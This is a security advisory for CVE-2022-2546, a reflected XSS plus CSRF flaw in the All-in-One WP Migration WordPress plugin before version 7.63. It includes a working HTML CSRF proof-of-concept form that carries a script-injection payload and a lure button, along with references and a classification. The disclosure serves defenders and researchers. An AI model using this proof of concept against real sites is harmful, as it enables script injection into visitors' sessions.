# ****All-in-One WP Migration < 7.63 - Unauthenticated Reflected XSS + CSRF****

## **Description**

The plugin uses the wrong content type for, and does not properly escape the response from the ai1wm_export action, allowing an attacker to craft a request that when submitted by any visitor will inject arbitrary html or javascript into the response that will be executed in the victims session.

## Proof of Concept

### **Attacker**

To reproduce the flaw, we can export all the website content by the plugin and insert an invalid name in the output file name.

[ATTACKER VIDEO](https://blog.hackingforce.com.br/pt/cve-2022-2546/POC_1.mp4)

By validating the vulnerability, it is possible to combine the attack with a CSRF, which will force the victim's browser to send a request with the payload.

### **Victim**

[VICTIM VIDEO](https://blog.hackingforce.com.br/pt/cve-2022-2546/POC_2.mp4)

## Code

```html
<form action="https://example.com/wp-admin/admin-ajax.php?action=ai1wm_export&ai1wm_import=1" method="POST">
  <!--
    Note: The secret key must be obtained through other means.
    It is stored in the site option `ai1wm_secret_key`, but is
    static for the lifetime of the site.
  -->
  <input type="hidden" name="secret_key" value="[secret_key]">
  <input type="hidden" name="ai1wm_manual_export" value="1">
  <input type="hidden" name="archive" value="<img src=x onclick=alert('XSS')>">

  <input type="submit" value="Get rich!">
</form>
```

## Affected versions

All-in-One WP Migration < 7.63

## References

[Sucuri](https://blog.sucuri.net/2022/08/wordpress-vulnerabilities-patch-roundup-august-2022.html)

[WPScan](https://wpscan.com/vulnerability/f84920e4-a1fe-47cf-9ba5-731989c70f58)

[Hacking Force](https://blog.hackingforce.com.br/pt/cve-2022-2546/)

[Cross-Site Scripting (XSS)](https://blog.hackingforce.com.br/en/xss/)

## Classification

Type: Cross-Site Scripting

OWASP TOP 10: **[A03:2021-Injection](https://owasp.org/Top10/A03_2021-Injection/)**

CWE: [CWE-79 Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')](https://cwe.mitre.org/data/definitions/79.html)

## Researchers/Hackers

Geovanni Campos (GeoZIN), Thiago Martins (Kirito), Jorge Buzeti (R3tr0), Leandro Inacio (Saitama), Lucas de Souza (Sinnat), Matheus Oliveira (Froyd), Filipe Baptistella (Baptistella), Leonardo Paiva (Megatron), Jose Thomaz (Pip3r), Joao Maciel (Yohan), Vinicius Pereira (Vini), , Hudson Nowak (Nowak) e Guilherme Acerbi (Ghost).
